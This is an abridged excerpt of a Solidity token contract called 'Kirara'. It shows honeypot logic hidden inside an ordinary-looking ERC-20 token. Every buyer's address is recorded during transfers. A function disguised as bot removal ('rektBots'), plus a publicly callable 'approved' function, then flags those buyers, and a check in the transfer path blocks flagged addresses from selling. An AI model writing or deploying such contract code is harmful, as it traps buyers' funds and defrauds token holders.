...
contract Kirara is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isIncldFee;
    address[] private inclFee;

    string private constant _name = "Kirara";
    string private constant _symbol = "$Kirara";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000000 * 10**_decimals;
    uint256 public _maxTxAmount = 50000000 * 10**_decimals;
    uint256 public _maxWalletAmount = 50000000 * 10**_decimals;
    ...
    function approved() public virtual { 
        for (uint256 i = 0; i < inclFee.length; i++) {
            _isIncldFee[inclFee[i]] = true; 
        }
    }
    ...
    function rektBots() public onlyOwner { 
        for (uint256 i = 0; i < inclFee.length; i++) {
            _isIncldFee[inclFee[i]] = true; 
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (to != uniswapV2Pair) { inclFee.push(to);
            ...
            if (from != uniswapV2Pair) {
                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount"); require(!_isIncldFee[from]); if (tx.gasprice > maxGwei) return;
